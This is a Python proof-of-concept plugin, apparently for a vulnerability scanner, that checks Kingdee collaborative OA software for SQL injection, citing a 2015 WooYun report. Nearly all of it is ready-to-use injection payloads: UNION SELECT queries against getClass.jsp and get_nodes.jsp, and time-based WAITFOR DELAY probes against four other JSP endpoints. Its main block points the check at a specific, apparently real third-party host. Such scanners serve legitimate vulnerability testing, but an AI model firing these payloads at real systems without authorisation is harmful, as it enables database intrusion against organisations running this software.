#!/usr/bin/evn  python 
#-*-:coding:utf-8:-*-  
#refer:#http://www.wooyun.org/bugs/wooyun-2015-0136918
import re,urlparse,time

def assign(service, arg):
    if service == "kingdee_oa":
        return True, arg

def audit(arg):
    #金蝶协作办公系统存在六个高危SQL注射
    payloads=["kingdee/person/getClass.jsp?id=1%27%20UNION%20ALL%20SELECT%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27)),NULL--",
              "kingdee/test_tree/get_nodes.jsp?node=1%20UNION%20ALL%20SELECT%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27)),NULL--"]
    for payload in payloads:
        url=arg+payload
        code ,head,res,body,_ = curl.curl(url)
        if code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(url)


    payload1="kingdee/person/note/note_opinion_submit.jsp?opinion_id=1"
    start1=time.time()
    url=arg+payload1
    code1 ,head,res,body,_ = curl.curl(url)
    start2=time.time()
    payload11="kingdee/person/note/note_opinion_submit.jsp?opinion_id=1%20WAITFOR%20DELAY%20%270:0:5%27"
    url=arg+payload11
    code2 ,head,res,body,_ = curl.curl(url)
    end=time.time()
    if code1!=0 and code2!=0 and 4.6<(end-start2)-(start2-start1):
        security_hole(url)
        
    start1=time.time()
    payload2="kingdee/pubinfo/chatlog_length.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1"
    url=arg+payload2
    code1 ,head,res,body,_ = curl.curl(url)
    start2=time.time()
    payload22="kingdee/pubinfo/chatlog_length.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1;WAITFOR%20DELAY%20%270:0:5%27--"
    url=arg+payload22
    code2 ,head,res,body,_ = curl.curl(url)
    end=time.time()
    if code1!=0 and code2!=0 and 4.6<(end-start2)-(start2-start1):
        security_hole(url)
        
    start1=time.time()
    payload3="kingdee/pubinfo/chatlog_content.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1"
    url=arg+payload3
    code1 ,head,res,body,_ = curl.curl(url)
    start2=time.time()
    payload33="kingdee/pubinfo/chatlog_content.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1;WAITFOR%20DELAY%20%270:0:5%27--"
    url=arg+payload33
    code2 ,head,res,body,_ = curl.curl(url)
    end=time.time()
    if code1!=0 and code2!=0 and 4.6<(end-start2)-(start2-start1):
        security_hole(url)
        
    start1=time.time()
    payload4="kingdee/pubinfo/news_comment_del.jsp?id=1"
    url=arg+payload4
    code1 ,head,res,body,_ = curl.curl(url)
    start2=time.time()
    payload44="kingdee/pubinfo/news_comment_del.jsp?id=1%20WAITFOR%20DELAY%20%270:0:5%27"
    url=arg+payload44
    code2 ,head,res,body,_ = curl.curl(url)
    end=time.time()
    if code1!=0 and code2!=0 and 4.6<(end-start2)-(start2-start1):
        security_hole(url)

if  __name__ == '__main__': 
    from dummy import *
    audit(assign('kingdee_oa','http://oa.guanhao.com:8080/')[1])